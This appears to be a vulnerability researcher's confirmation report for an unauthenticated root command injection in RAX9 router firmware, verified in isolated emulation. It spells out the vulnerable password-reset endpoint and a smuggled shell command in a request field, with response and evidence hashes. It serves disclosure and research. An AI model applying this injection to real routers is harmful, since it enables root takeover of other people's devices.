# RAX9 V1.0.3.32 full-system pre-authentication RCE confirmation

Date: 2026-07-24 UTC

The clean official RAX9 V1.0.3.32 SquashFS was booted as a MIPS initramfs with
an official Debian Malta kernel. QEMU networking was restricted and exposed
only through `127.0.0.1:35909`.

The unauthenticated request selected `accessCtrlDev` through
`/pwd_reset/reset_pwd.plua` and supplied the fixed value:

`FRIDAY;touch /tmp/rax9-preauth-rce-marker;#`

The endpoint returned HTTP 200 and:

`{"status":"success","message":"Finish accessCtrlDev"}`

The native guest subsequently reported:

`FRIDAY_RAX9_PREAUTH_RCE_MARKER=present`

The marker metadata showed UID 0 and GID 0. Relevant evidence is in
`serial.log` lines 228-235.

## Integrity

- `reset_pwd.plua`:
  `bd62b134347c8d8844bd4e69c1a72bc185c100d5a560abbd68bc1af4fa9e01f5`
- `accessCtrlDev.lua`:
  `c06410be39e566b5525efb1c01e5e6a8e617e63ff66ffc7cfbe0871b3d5e8b11`
- Production `fork.lua`:
  `4d7a827dd6a229fe82c97bce57a96b6e2e22f9479ca3742e147ee5274c9d1f7b`
- `rax9-web-rootfs.cpio.gz`:
  `026229cdb820c320db077c27b40d0321efa624ecf5deacb48b7bc9d2a86cbbaa`
- `serial.log`:
  `322028e1258cf5aeb84baf32b9ab8f9bb1d951061ac6a8edcbf7042409313905`

Classification: confirmed unauthenticated adjacent-network root command
injection / remote code execution in full-system emulation. Zero-day novelty
has not yet been established.
